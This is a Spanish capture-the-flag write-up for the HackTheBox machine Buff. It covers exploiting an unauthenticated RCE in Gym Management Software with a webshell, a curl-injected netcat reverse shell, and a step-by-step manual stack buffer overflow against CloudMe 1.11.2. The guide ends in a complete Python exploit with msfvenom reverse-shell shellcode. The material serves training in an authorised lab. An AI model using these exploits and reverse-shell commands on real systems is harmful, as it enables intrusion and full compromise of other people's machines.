---
title:  "Buff Writeup [ES] - HackTheBox"
date:   2022-05-19 18:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [easy, windows, buffer-overflow]
image:
  src: /images/HTB/Buff/00-banner.png
  width: 620
  height: 410
---

# Resumen

[Buff](https://app.hackthebox.com/machines/263) es una máquina **Windows** de dificultad Easy de la plataforma de [Hack The Box](https://app.hackthebox.com/), incluye abuso y explotación de un CMS desactualizado en la intrusión, y un buffer overflow stack-based para la fase de escalada de privlegios.

Aprovecharé esta ocasión para practicar y documentar la parte del Buffer Overflow, por lo que no será directamente un writeup de como rootear la máquina, sino una oportunidad para ganar training en esta área.

---

# Enumeración

## NMAP

En esta fase utilizaremos los siguientes scripts personalizados.

> **nmap-scan.sh**: Realiza SYN-SCAN a los 65535 puertos y deposita el output al archivo ```allPorts.gnmap```

> **nmap-services.sh**: Lee y parsea un archivo "grepeable" de nmap  obtiene IP y puertos para realizar un escaneo de servicios a estos últimos.

* ```sudo nmap-scan.sh buff.htb```
* ```nmap-services.sh allPorts.gnmap```

```plaintext
nmap -sCV -p7680,8080 -n -oN tcp-ports.nmap buff.htb -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 18:45 -04
Nmap scan report for buff.htb
Host is up (0.16s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.42 seconds
```

Por lo visto solo disponemos de dos puertos accesibles, el ```7680``` que no reporta mucha información, y el ```8080``` en donde existe un servicio web.

## Enumeración Web - 8080

Al ingresar, lo primero que se visualiza es un sitio web que va de la mano con la temática de la máquina, simula ser la página web de un gimnasio.

![](/images/HTB/Buff/05-website.png)

A nivel de las tecnologías utilizadas para crear el sitio, tenemos ```php``` y ```javascript (jquery)```.

![](/images/HTB/Buff/07-wappalyzer.png)

Investigando la página web, no vemos mucha información interesante, a excepción de el mensaje ```Made using Gym Management Software 1.0``` en la pestaña **Contact**, esto inmediatamente nos hace pensar que se utilizó un **CMS** para construir la web y al ser una máquina de dificultad Easy, es posible que exista alguna forma de explotarlo.

![](/images/HTB/Buff/10-contact-page.png)

Si tomamos ese nombre y buscamos por *Gym Management* en searchsploit, encontramos lo siguiente.

![](/images/HTB/Buff/15-searchsploit.png)

De lo encontrado, llama la atención un script en particular, ya que permite ejecución remota de comandos **RCE** sin estar autenticado.

# Consola como Shaun

Descargamos el exploit y lo renombramos como ```exploit.py```.

![](/images/HTB/Buff/18-download-exploit.png)

Dentro de su código hay una explicación de como se aprovecha de una vulnerabilidad del CMS para subir un archivo ```.php``` con una simple webshell para ejecutar comandos en la máquina remota.

![](/images/HTB/Buff/20-exploit.png)

Ejecutamos y solamente nos solicita proporcionar la dirección URL del sitio web.

```bash
python2.7 exploit.py http://buff.htb:8080/
```

![](/images/HTB/Buff/23-exploit-2.png)

Enviamos la URL y ya nos conecta a la webshell, en donde ya es posible ejecutar comandos.

En otra pestaña compartiré a través de smb el binario de ```nc.exe``` para entablar una reverse shell en condiciones.

![](/images/HTB/Buff/26-share-nc.png)

Ahora bien, solo resta inyectar el comando para la reverse shell utilizando el ```nc.exe``` compartido previamente. En esta ocasión el comando lo inyectaré directamente con ```curl```, ya que según la documentación del exploit, se ha subido un archivo llamado ```kamehameha.php```, el cual recibe la variable ```telepathy``` a través del método **GET**.

En mi caso, la ruta completa es: ```http://buff.htb:8080/upload/kamehameha.php```.

```bash
curl -s "http://buff.htb:8080/upload/kamehameha.php" -G --data-urlencode 'telepathy=\\10.10.14.116\shared\nc.exe -e cmd 10.10.14.116 443'
```

Ejecutamos y conseguimos una shell como el usuario **shaun**.

![](/images/HTB/Buff/28-shell-as-shaun.png)

Una vez dentro, lo siguiente sería enumerar internamente en búsqueda de métodos para escalar privilegios.

Antes de ejecutar herramientas de *recon* como [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), una simple enumeración del directorio home de nuestro usuario nos revela un ```.exe``` interesante.

![](/images/HTB/Buff/35-cloudme-downloads.png)

Una búsqueda rápida del binario en google nos indica que es vulnerable a **Buffer Overflow** y que éste levanta un servicio en el puerto 8888.

![](/images/HTB/Buff/39-cloudme-search.png)

Al lanzar un ```netstat``` dentro de la máquina vemos que existe un servicio ejecutándose bajo ese puerto, pero sólo **localmente**. 

> Este servicio deberá ser expuesto más adelante con la ayuda de [chisel](https://github.com/jpillora/chisel).

![](/images/HTB/Buff/40-netstat.png)

Si buscamos **CloudMe** en searchsploit, al igual que con el CMS, vemos que existen exploits públicos para abusar del Buffer Overflow.

![](/images/HTB/Buff/38-cloudme-searchsploit.png)

Considerando que la máquina ya ha sido demasiado fácil y lanzar otro exploit de un tercero no tendría mucho mérito, descargaremos el binario vulnerable y construiremos el exploit de forma manual. Podemos descargarlo desde la máquina *Buff*, o bien, utilizar el enlace proporcionado en el exploit.

* ```searchsploit -x windows/remote/48389.py```

![](/images/HTB/Buff/42-cloudme-bof-poc.png)

* Enlace: [https://www.cloudme.com/downloads/CloudMe_1112.exe](https://www.cloudme.com/downloads/CloudMe_1112.exe)

---

# Consola como Administrator

## Buffer Overflow

Ya sabemos que CloudMe en su versión 1.11.2 es vulnerable a desbordamiento de buffer, procederemos a crear un ambiente local para explotarlo y depurar la aplicación.

### Requisitos

* Una VM de Windows (32 bits)
* Immunity Debugger + [mona.py](https://github.com/corelan/mona/blob/master/mona.py)
* Abrir puerto 8888 a nivel de red local o crear túnel con chisel

Para explotar correctamente un BOF stack-based de 32 bits, el orden será el siguiente:

1. [Fuzzear para identificar el offset](#obteniendo-el-offset)
2. [Tomar control de EIP](#tomar-control-de-eip)
4. [Identificar badchars](#identificar-badchars)
5. [Descubrir una operación jmp_esp para asignar al EIP](#obtener-jmp-esp)
6. [Generar shellcode](#generar-shellcode)
7. [Juntar todo en un script para explotar remotamente a la máquina víctima](#exploit)


> **Disclaimer:** No soy ningún experto en explotación de binarios / bof, pero realizo este tipo de contenido para utilizarlo como ayuda-memoria o para quien pueda serle de utilidad.

> Trataré explicar paso a paso de la mejor manera posible cada punto sin entrar al detalle de como funciona todo a bajo nivel, para eso al final de este post en [Recursos](#recursos) dejaré más información de otras fuentes mucho más detalladas.

### Preparación entorno

En mi caso estoy utilizando una VM de Windows 10 de 32 bits y ya tengo instalado **CloudMe** y funcionando correctamente.

![](/images/HTB/Buff/65-cloudme-installed.png)

Antes de iniciar **Immunity Debugger**, es importante contar con mona instalado, para ésto es simplemente descargarlo desde [Github](https://github.com/corelan/mona/blob/master/mona.py) y copiarlo a la carpeta ```PyCommands``` dentro del directorio de instalación de Immunity.

En mi caso la ruta completa es:

* ```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```

![](/images/HTB/Buff/64-mona.png)

Dentro de Immunity existe una barra inferior que nos permitirá ejecutar comandos, acá es donde podremos llamar a ```mona.py```. Lo primero a configurar es el directorio de trabajo en donde *mona* enviará el output de los comandos ejecutados.

* ```!mona config -set workingfolder c:\Users\Cervant\Desktop\%p```

![](/images/HTB/Buff/64-mona-config.png)

> **%p** creará un directorio con el nombre del programa que estemos depurando.

Una vez con esto listo, nos sincronizaremos al proceso de CloudMe.

Iremos a ***File > Attach*** o pulsaremos ```CTRL + F1``` y nos mostrará una lista de los procesos del sistema. Acá solamente es buscar CloudMe y darle a Attach.

![](/images/HTB/Buff/66-attach-process-cloudme.png)

Ya en este punto solo resta darle al botón de *play* para comenzar con la depuración.

![](/images/HTB/Buff/67-start-debug.png)

Importante considerar que cada vez que provoquemos un desbordamiento del buffer, la ejecución de la aplicación se corromperá y cerrará. Aquí tenemos la opción de volver a abrir CloudMe de manera manual y sincronizarnos al proceso con Immunity como fué mostrado anteriormente, o bien presionar ```<<``` para que Immunity haga esta tarea por nosotros.

![](/images/HTB/Buff/68-restart-program.png)

Nos aseguramos que Immunity se encuentra sincronizado a CloudMe, en estado **Running** y continuamos al siguiente paso.

![](/images/HTB/Buff/69-immunity-debugger.png)

---

### Obteniendo el offset

Normalmente crearía un fuzzer automático que vaya incrementando su valor en bytes por cada iteración y que envíe esa data a la app vulnerable, como el que se muestra a continuación.

```python
#!/usr/bin/python3
from pwn import *

host = "127.0.0.1"
port = 8888
buf = b""
context.log_level = 'error'

while True:
    try:
        buf += b'A'*100 
        r = remote(host, port)
        print("[+] Enviando {} bytes".format(len(buf))) 
        r.send(buf)
        r.close()
    except Exception as e:
        log.info(str(e))
```
{: file="fuzzer.py" }

Pero en este caso no tenemos forma de saber si hemos tumbado el servicio remoto, ya que estamos replicando el puerto del servicio con chisel y éste siempre se encontrará disponible, por lo tanto, no obtendremos un problema de conexión como normalmente ocurriría.

Lo que haremos a continuación es crear directamente nuestro ```bof.py``` e ir modíficandolo a medida que necesitemos hacerlo.

![](/images/HTB/Buff/70-bof-1.png)

Ejecutaremos ```bof.py```.

![](/images/HTB/Buff/71-run-bof-1.png)

Validamos en la VM Windows e identificamos lo siguiente:

1. El debugger se encuentra en estado "Paused" lo que indica que efectivamente desbordamos el buffer.
2. Hemos sobrescrito el **EIP** con nuestras "A" (41 en hexadecimal).
3. Tambien vemos que el **ESP** ha sido sobrescrito.

![](/images/HTB/Buff/72-bof1-debug.png)

Continuando, ahora debemos buscar un método para calcular exactamente cuanto es el **offset**, es decir, cuantas "A" debemos inyectar antes de sobrescribir el **EIP**. Para esto hay una utilidad muy cómoda de la suite de **metasploit** llamada ```pattern_create.rb``` que nos permitirá crear una cadena de caracteres especialmente diseñada.

![](/images/HTB/Buff/73-pattern-create.png)

También tendríamos la opcion de generar un patrón desde **mona**.

* ```!mona pc 2000```

![](/images/HTB/Buff/73-pattern-create-mona.png)

Nos quedaremos con el obtenido desde metasploit, ejecutamos nuevamente y enviamos la nueva cadena como payload. En esta ocasión deberemos tomar nota del valor de **EIP** para obtener el offset.


![](/images/HTB/Buff/74-run-with-pattern.png)

Tomamos ese valor y de vuelta en nuestra máquina, ejecutaremos ```pattern_offset.rb``` entregándole el valor obtenido anteriormente y anteponiendo ```0x```.

![](/images/HTB/Buff/75-pattern-offset.png)

Otro método para obtener este valor, es utilizando mona. Al comando es necesario proporcionarle la longitud de la cadena creada anteriormente.

* ```!mona findmsp -distance 2000```

![](/images/HTB/Buff/76-pattern-offset-mona.png)

El output muestra exactamente el mismo resultado, **1052** de offset. 

Lo cómodo de **mona** es que también guardará el resultado de cada comando en un archivo dentro de la carpeta de trabajo

---

### Tomar control de EIP

Ahora que sabemos que el offset es 1052, modificaremos el payload enviado para validar que estamos en lo correcto. Inyectaremos "A" los 1052 primeros bytes, luego "B" los siguientes 4 bytes (EIP) y por último "C" 500 veces que irán a la pila (ESP).

Nuestro script quedaría de la siguiente forma.

![](/images/HTB/Buff/78-script-controlling-eip.png)

Verificamos desde el debugger y efectivamente vemos que **EIP** vale "42424242" lo cual corresponde a "BBBB". También se valida que las "C" fueron inyectadas a **ESP**.

![](/images/HTB/Buff/77-controlling-eip.png)

Si en la dirección de ESP damos *clic derecho* y seleccionamos **Follow in Dump**, tendremos una vista más cómoda de como se ha inyectado el payload.

![](/images/HTB/Buff/79-follow-dump-esp.png)

---

### Identificar badchars

El próximo paso es identificar los badchars, es decir, carácteres que deben ser omitidos del shellcode para evitar problemas durante su ejecución, uno que debe ser omitido por defecto es el caracter NULL ```\x00```.

Generaremos un bytearray con mona excluyendo de una vez el byte null.

* ```!mona bytearray -b "\x00"```

![](/images/HTB/Buff/80-bytearray-mona.png)

Ayudándonos de ```python``` haremos lo mismo en nuestro Linux.

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Ahora la idea es agregar estos badchars a nuestro payload y enviarlos justo después del **EIP**, de esta manera se inyectarán en **ESP** y tendremos una forma de validar si existe algún otro __badchar__.

![](/images/HTB/Buff/81-bof-badchars.png)

Enviamos y verificamos que hemos correctamente desbordado el buffer e insertado nuestros caracteres dentro de **ESP**.

![](/images/HTB/Buff/82-badchars-dump.png)

Esto se puede enumerar manualmente realizando una comparación de cada caracter enviado con cada caracter presente en la pila, si hay alguno que no aparezca acá desde el lado del debugger, quiere decir que es un badchar. Afortunadamente existe una manera más fácil de realizarlo con la ayuda de mona.

Utilizaremos el bytearray creado anteriormente y lo compararemos con lo que hay insertado en ESP. Antes de ejecutar deberemos obtener la dirección de ESP.

![](/images/HTB/Buff/83-copy-esp-address.png)

Ahora con todos los datos, comparamos.

* ```!mona compare -f C:\Users\Cervant\Desktop\CloudMe\bytearray.bin -a 00A3D3D0```

![](/images/HTB/Buff/84-mona-compare.png)

Como se puede apreciar, recibimos un mensaje que dice "Unmodified" lo que indica que no existe ningún otro badchar para esta aplicación en particular.

---

### Obtener JMP ESP

Ahora toca el turno de obtener un valor válido para EIP, en otras palabras, deberemos encontrar una operación JMP ESP que nos permita acceder al shellcode que insertaremos.

* ```!mona jmp -r esp -cpb "\x00"```

![](/images/HTB/Buff/85-jmp-esp.png)

Nos quedaremos con la dirección ```69A5F0EF``` y la agregaremos al exploit.

---

### Generar shellcode

Por último, deberemos generar un shellcode que nos permita obtener una reverse shell.

* ```msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode```


| Parámetro   | Definición                                |
|-------------|-------------------------------------------|
| ```-p```    | Payload a utilizar                        |
| ```-a```    | Arquitectura (x64/x86)                    |
| ```-b```    | Badchars a omitir                         |
| ```-f```    | Formato en que se exportará el resultado  |
| ```-v```    | Definición de variable                    |
| ```LHOST``` | Host que recibirá la conexión (IP)        |
| ```LPORT``` | Puerto por el que se recibirá la conexión |

msfvenom por defecto nos agregará el encoder **shikata_ga_nai** y debido a que le agregamos los parámetros ```-f``` y ```-v```, nos ha agregado todo el shellcode de una manera cómoda a la variable definida.

![](/images/HTB/Buff/86-shellcode-generation-local.png)

> Considerar que para que el shellcode se decodifique e interprete correctamente, deberemos agregar un "colchón" de nops (\x90) justo antes.

---

### Exploit 

Agregamos todo lo anterior al script y primero, antes de ejecutarlo contra **Buff**, lo ejecutaré localmentre contra la VM.

![](/images/HTB/Buff/87-bof-exploit-local.png)

**¡Y Funciona correctamente!**

Para la explotación contra la máquina de **HTB** deberemos generar nuevamente el shellcode indicando la IP de la VPN como ```LHOST```. El script final quedaría de la siguiente forma.

```python
#!/usr/bin/python3
from pwn import *

host = "127.0.0.1"
port = 8888
offset = 1052
junk = b"A"*offset

# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.116 LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode
shellcode =  b""
shellcode += b"\xdd\xc2\xd9\x74\x24\xf4\xb8\xf7\xb9\x52\xb0"
shellcode += b"\x5a\x29\xc9\xb1\x52\x83\xc2\x04\x31\x42\x13"
shellcode += b"\x03\xb5\xaa\xb0\x45\xc5\x25\xb6\xa6\x35\xb6"
shellcode += b"\xd7\x2f\xd0\x87\xd7\x54\x91\xb8\xe7\x1f\xf7"
shellcode += b"\x34\x83\x72\xe3\xcf\xe1\x5a\x04\x67\x4f\xbd"
shellcode += b"\x2b\x78\xfc\xfd\x2a\xfa\xff\xd1\x8c\xc3\xcf"
shellcode += b"\x27\xcd\x04\x2d\xc5\x9f\xdd\x39\x78\x0f\x69"
shellcode += b"\x77\x41\xa4\x21\x99\xc1\x59\xf1\x98\xe0\xcc"
shellcode += b"\x89\xc2\x22\xef\x5e\x7f\x6b\xf7\x83\xba\x25"
shellcode += b"\x8c\x70\x30\xb4\x44\x49\xb9\x1b\xa9\x65\x48"
shellcode += b"\x65\xee\x42\xb3\x10\x06\xb1\x4e\x23\xdd\xcb"
shellcode += b"\x94\xa6\xc5\x6c\x5e\x10\x21\x8c\xb3\xc7\xa2"
shellcode += b"\x82\x78\x83\xec\x86\x7f\x40\x87\xb3\xf4\x67"
shellcode += b"\x47\x32\x4e\x4c\x43\x1e\x14\xed\xd2\xfa\xfb"
shellcode += b"\x12\x04\xa5\xa4\xb6\x4f\x48\xb0\xca\x12\x05"
shellcode += b"\x75\xe7\xac\xd5\x11\x70\xdf\xe7\xbe\x2a\x77"
shellcode += b"\x44\x36\xf5\x80\xab\x6d\x41\x1e\x52\x8e\xb2"
shellcode += b"\x37\x91\xda\xe2\x2f\x30\x63\x69\xaf\xbd\xb6"
shellcode += b"\x3e\xff\x11\x69\xff\xaf\xd1\xd9\x97\xa5\xdd"
shellcode += b"\x06\x87\xc6\x37\x2f\x22\x3d\xd0\x5a\xb9\x33"
shellcode += b"\x54\x33\xbf\x4b\x95\x78\x36\xad\xff\x6e\x1f"
shellcode += b"\x66\x68\x16\x3a\xfc\x09\xd7\x90\x79\x09\x53"
shellcode += b"\x17\x7e\xc4\x94\x52\x6c\xb1\x54\x29\xce\x14"
shellcode += b"\x6a\x87\x66\xfa\xf9\x4c\x76\x75\xe2\xda\x21"
shellcode += b"\xd2\xd4\x12\xa7\xce\x4f\x8d\xd5\x12\x09\xf6"
shellcode += b"\x5d\xc9\xea\xf9\x5c\x9c\x57\xde\x4e\x58\x57"
shellcode += b"\x5a\x3a\x34\x0e\x34\x94\xf2\xf8\xf6\x4e\xad"
shellcode += b"\x57\x51\x06\x28\x94\x62\x50\x35\xf1\x14\xbc"
shellcode += b"\x84\xac\x60\xc3\x29\x39\x65\xbc\x57\xd9\x8a"
shellcode += b"\x17\xdc\xf9\x68\xbd\x29\x92\x34\x54\x90\xff"
shellcode += b"\xc6\x83\xd7\xf9\x44\x21\xa8\xfd\x55\x40\xad"
shellcode += b"\xba\xd1\xb9\xdf\xd3\xb7\xbd\x4c\xd3\x9d"

# jmp_esp: 69A5F0EF
payload = flat(junk, 0x69A5F0EF, asm('nop')*20, shellcode)

try:
    r = remote(host, port)
    print("[+] Enviando {} bytes!".format(len(payload)))
    r.send(payload)
    r.close()
except Exception as e:
    log.info(str(e))
```
{: file="bof.py" }

Hacemos un remote port forwarding con la consola de bajo nivel obtenida anteriormente.

1. Desde la máquina local ejecutamos chisel como server y en modo reverse.
2. Desde la Máquina Buff nos conectamos como cliente y realizamos un remote port forwarding del puerto 8888.

![](/images/HTB/Buff/89-chisel-tunnel-v2.png)

Y finalmente lanzamos nuestro exploit.

![](/images/HTB/Buff/90-rooted.png)

Ya a partir de aquí la máquina estaría rooteada y encontrar e ingresar las flag no tiene ciencia alguna.

![](/images/HTB/Buff/100-pwned.png)

> ¡Happy Hacking and keep grinding!

---


# Recursos

* Resolución de Buff (s4vitar): [https://youtu.be/TytUFooC3kU](https://youtu.be/TytUFooC3kU)
* Buffer Overflow prep (Tryhackme): [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)
* Buffer Overflow basics (TCM): [https://youtu.be/qSnPayW6F7U](https://youtu.be/qSnPayW6F7U) 
* [https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5](https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5)
* [https://github.com/joshua17sc/Buffer-Overflows](https://github.com/joshua17sc/Buffer-Overflows)